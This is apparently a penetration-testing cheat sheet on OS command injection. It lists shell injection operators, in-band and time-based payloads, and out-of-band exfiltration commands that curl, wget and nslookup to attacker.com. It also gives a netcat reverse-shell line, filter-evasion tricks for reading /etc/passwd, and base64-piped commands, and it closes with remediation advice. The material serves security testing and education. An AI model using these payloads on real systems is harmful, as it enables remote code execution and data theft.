---
description: OS Command Injection methodology. Covers blind injection, time-based detection, out-of-band (OAST) exfiltration, and WAF/filter bypasses using space evasion and obfuscation.
tags: Command Injection, RCE, OS Injection, Web, Bypasses
---

# OS Command Injection

OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application.

## Discovery & Initial Reconnaissance

1. Identify parameters that might be passed to the underlying operating system.
   - User inputs used for ping/traceroute/nslookup functions.
   - File processing mechanisms (e.g., video conversion, image manipulation).
   - Email sending features (where arguments might be passed to `sendmail`).
   - Server status/diagnostic tools.
2. Inject command separators alongside expected input to observe application behavior.

## Injection Operators

### Linux / Unix
- `;` (Command separator)
- `&` (Background execution / AND)
- `&&` (AND - executes if the first succeeds)
- `|` (Pipe - passes output to the next command)
- `||` (OR - executes if the first fails)
- `\n` or `0x0a` (Newline)
- `$()` or `\` \`` (Inline execution)

### Windows
- `&` (Command separator)
- `&&` (AND)
- `|` (Pipe)
- `||` (OR)

## Detection Techniques

### 1. In-band (Visible Output)
If the application directly returns the output of the command:
```bash
127.0.0.1; id
127.0.0.1| whoami
```

### 2. Time-Based (Blind)
If the application doesn't return output, but you can delay the response:
```bash
127.0.0.1; sleep 10
127.0.0.1| ping -c 10 127.0.0.1
127.0.0.1& timeout /t 10  (Windows)
```

### 3. Out-of-Band (OAST)
If the application executes the command asynchronously or filters output:
```bash
# DNS Exfiltration
127.0.0.1; nslookup $(whoami).attacker.com

# HTTP Exfiltration
127.0.0.1; curl http://attacker.com/$(whoami)
127.0.0.1; wget http://attacker.com/$(whoami)

# Windows OAST
127.0.0.1 & nslookup %USERNAME%.attacker.com
```

## Advanced Bypass Techniques & Payloads

### Space Evasion
When spaces are filtered by a WAF or input validation:
- Use `$IFS` (Internal Field Separator): `cat$IFS/etc/passwd` or `cat${IFS}/etc/passwd`
- Input redirection: `cat</etc/passwd`
- Brace expansion: `{cat,/etc/passwd}`
- Tab character: `cat%09/etc/passwd`

### Command Obfuscation & Character Bypasses
When specific command names (like `cat` or `nc`) are blocked:
- Single quotes: `c'a't /etc/passwd`
- Double quotes: `c"a"t /etc/passwd`
- Backslashes: `c\at /etc/passwd`
- Variable expansion: `a=c; b=at; $a$b /etc/passwd`
- The `$@` variable (which is empty): `c$@at /etc/passwd`

### Wildcard Injection
When explicit paths or commands are blocked, you can use shell globbing:
- `/bin/cat /etc/passwd` -> `/?in/c?t /?tc/p?sswd`
- `nc -e /bin/sh attacker.com 4444` -> `/???/n? -e /???/s? attacker.com 4444`

### Base64 Encoding
Encode the command to bypass signature-based WAFs:
```bash
# `id` encoded is `aWQ=`
; echo aWQ= | base64 -d | sh
; echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
```

## Remediation

- **Never pass unvalidated user input directly to the system shell.**
- Use built-in library functions instead of system commands (e.g., use a native `mkdir` function in PHP/Node.js instead of `system("mkdir " + folder)`).
- If you must call external commands, strictly validate the input against a tight allow-list.
- Use parameterized APIs (like `execFile` in Node.js or `subprocess.run` with `shell=False` in Python) to prevent shell interpretation of metacharacters.

- **Author**: **Vivek Chanchal**
